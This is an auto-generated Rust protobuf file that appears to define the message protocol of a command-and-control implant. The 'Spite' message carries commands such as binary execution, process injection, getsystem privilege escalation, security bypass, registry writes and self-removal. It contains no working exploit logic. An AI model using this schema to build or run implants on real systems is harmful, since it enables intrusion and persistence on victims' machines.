// This file is @generated by prost-build.
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct Empty {}
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Status {
    #[prost(uint32, tag = "1")]
    pub task_id: u32,
    /// unexcept error
    #[prost(int32, tag = "2")]
    pub status: i32,
    /// std err
    #[prost(string, tag = "3")]
    pub error: ::prost::alloc::string::String,
}
/// implant call and back data
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Spite {
    #[prost(string, tag = "1")]
    pub name: ::prost::alloc::string::String,
    #[prost(uint32, tag = "2")]
    pub task_id: u32,
    #[prost(bool, tag = "3")]
    pub r#async: bool,
    #[prost(uint64, tag = "4")]
    pub timeout: u64,
    #[prost(uint32, tag = "5")]
    pub error: u32,
    #[prost(message, optional, tag = "6")]
    pub status: ::core::option::Option<Status>,
    #[prost(
        oneof = "spite::Body",
        tags = "10, 11, 13, 14, 15, 16, 20, 21, 22, 23, 24, 25, 26, 27, 31, 32, 35, 36, 37, 38, 39, 101, 102, 104, 105, 106, 107, 108, 109, 110, 111, 112, 118, 119, 121, 122, 123, 124, 125, 126, 127, 128, 130, 131, 132, 140"
    )]
    pub body: ::core::option::Option<spite::Body>,
}
/// Nested message and enum types in `Spite`.
pub mod spite {
    #[derive(Clone, PartialEq, ::prost::Oneof)]
    pub enum Body {
        #[prost(message, tag = "10")]
        Empty(super::Empty),
        #[prost(message, tag = "11")]
        Block(super::super::modulepb::Block),
        #[prost(message, tag = "13")]
        Ack(super::super::modulepb::Ack),
        #[prost(message, tag = "14")]
        Task(super::super::modulepb::ImplantTask),
        #[prost(message, tag = "15")]
        SleepRequest(super::super::modulepb::Timer),
        #[prost(message, tag = "16")]
        Init(super::super::modulepb::Init),
        #[prost(message, tag = "20")]
        Sysinfo(super::super::modulepb::SysInfo),
        #[prost(message, tag = "21")]
        Register(super::super::modulepb::Register),
        #[prost(message, tag = "22")]
        Ping(super::super::modulepb::Ping),
        #[prost(message, tag = "23")]
        Suicide(super::super::modulepb::Suicide),
        #[prost(message, tag = "24")]
        Request(super::super::modulepb::Request),
        #[prost(message, tag = "25")]
        Response(super::super::modulepb::Response),
        #[prost(message, tag = "26")]
        ExecuteBinary(super::super::modulepb::ExecuteBinary),
        #[prost(message, tag = "27")]
        BinaryResponse(super::super::modulepb::BinaryResponse),
        #[prost(message, tag = "31")]
        LoadModule(super::super::modulepb::LoadModule),
        #[prost(message, tag = "32")]
        Modules(super::super::modulepb::Modules),
        #[prost(message, tag = "35")]
        LoadAddon(super::super::modulepb::LoadAddon),
        #[prost(message, tag = "36")]
        Addons(super::super::modulepb::Addons),
        #[prost(message, tag = "37")]
        ExecuteAddon(super::super::modulepb::ExecuteAddon),
        #[prost(message, tag = "38")]
        WmiRequest(super::super::modulepb::WmiQueryRequest),
        #[prost(message, tag = "39")]
        WmiMethodRequest(super::super::modulepb::WmiMethodRequest),
        #[prost(message, tag = "101")]
        LsResponse(super::super::modulepb::LsResponse),
        #[prost(message, tag = "102")]
        ChownRequest(super::super::modulepb::ChownRequest),
        #[prost(message, tag = "104")]
        ExecRequest(super::super::modulepb::ExecRequest),
        #[prost(message, tag = "105")]
        ExecResponse(super::super::modulepb::ExecResponse),
        #[prost(message, tag = "106")]
        UploadRequest(super::super::modulepb::UploadRequest),
        #[prost(message, tag = "107")]
        DownloadRequest(super::super::modulepb::DownloadRequest),
        #[prost(message, tag = "108")]
        DownloadResponse(super::super::modulepb::DownloadResponse),
        #[prost(message, tag = "109")]
        NetstatResponse(super::super::modulepb::NetstatResponse),
        #[prost(message, tag = "110")]
        PsResponse(super::super::modulepb::PsResponse),
        #[prost(message, tag = "111")]
        BypassRequest(super::super::modulepb::BypassRequest),
        #[prost(message, tag = "112")]
        ExecuteCommand(super::super::modulepb::ExecuteCommand),
        #[prost(message, tag = "118")]
        IfconfigResponse(super::super::modulepb::IfconfigResponse),
        #[prost(message, tag = "119")]
        CurlRequest(super::super::modulepb::CurlRequest),
        #[prost(message, tag = "121")]
        RegistryRequest(super::super::modulepb::Registry),
        #[prost(message, tag = "122")]
        RegistryWriteRequest(super::super::modulepb::RegistryWriteRequest),
        #[prost(message, tag = "123")]
        ScheduleRequest(super::super::modulepb::TaskSchedule),
        #[prost(message, tag = "124")]
        SchedulesResponse(super::super::modulepb::TaskSchedulesResponse),
        #[prost(message, tag = "125")]
        ScheduleResponse(super::super::modulepb::TaskSchedule),
        #[prost(message, tag = "126")]
        ServiceRequest(super::super::modulepb::ServiceConfig),
        #[prost(message, tag = "127")]
        ServicesResponse(super::super::modulepb::ServicesResponse),
        #[prost(message, tag = "128")]
        ServiceResponse(super::super::modulepb::Service),
        #[prost(message, tag = "130")]
        RunasRequest(super::super::modulepb::RunAsRequest),
        #[prost(message, tag = "131")]
        Getsystem(super::super::modulepb::GetSystem),
        #[prost(message, tag = "132")]
        Inject(super::super::modulepb::Inject),
        #[prost(message, tag = "140")]
        PipeRequest(super::super::modulepb::Pipe),
    }
}
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct Spites {
    #[prost(message, repeated, tag = "1")]
    pub spites: ::prost::alloc::vec::Vec<Spite>,
}
